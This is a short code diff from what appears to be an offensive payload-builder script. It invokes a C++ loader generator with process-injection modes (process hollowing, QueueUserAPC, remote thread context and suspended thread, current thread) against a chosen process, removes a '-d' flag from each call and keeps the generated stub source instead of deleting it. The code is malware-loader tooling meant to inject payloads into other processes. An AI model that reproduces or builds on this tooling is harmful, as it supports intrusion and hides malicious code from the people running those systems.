@@ -320,22 +320,22 @@ def main(powershell_to_vbs, PowerShell_stub, Power_loader, Cpp_injection_mode_op
                         
                         if Inject_Module in ["1", "processhollow"]:
                                 os.system(
-                                """python Stub\\Cpp_loader.py "{0}" -m processhollow -p {1} -d -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
+                                """python Stub\\Cpp_loader.py "{0}" -m processhollow -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
                         elif Inject_Module in ["2", "QueueUserAPC", "queueUserapc"]:
                             os.system(
-                                """python Stub\\Cpp_loader.py "{0}"  -m queueUserapc -p {1} -d -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
+                                """python Stub\\Cpp_loader.py "{0}"  -m queueUserapc -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
                         elif Inject_Module in ["3", "RemoteThreadContext", "remotethreadcontext"]:
                             os.system(
-                                """python Stub\\Cpp_loader.py "{0}"  -m remotethreadcontext -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile,str(outfile)))
+                                """python Stub\\Cpp_loader.py "{0}"  -m remotethreadcontext -p {1} -o "{2}"\n""".format(filepath, inject_option,outfile,str(outfile)))
                         elif Inject_Module in ["4", "RemoteThreadSuspended", "remoteThreadsuspended"]:
                             os.system(
-                                """python Stub\\Cpp_loader.py "{0}" -p {1} -m remoteThreadsuspended -d -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
+                                """python Stub\\Cpp_loader.py "{0}" -p {1} -m remoteThreadsuspended -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
                         elif Inject_Module in ["5", "CurrentThread", "currentthread"]:
                             os.system(
-                                """python Stub\\Cpp_loader.py "{0}" -m currentthread -p {1} -d -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
+                                """python Stub\\Cpp_loader.py "{0}" -m currentthread -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
                         
                         print("\n")
-                        os.system("del stub.cpp")
+                        #os.system("del stub.cpp")
                         break
                     except:
                         continue
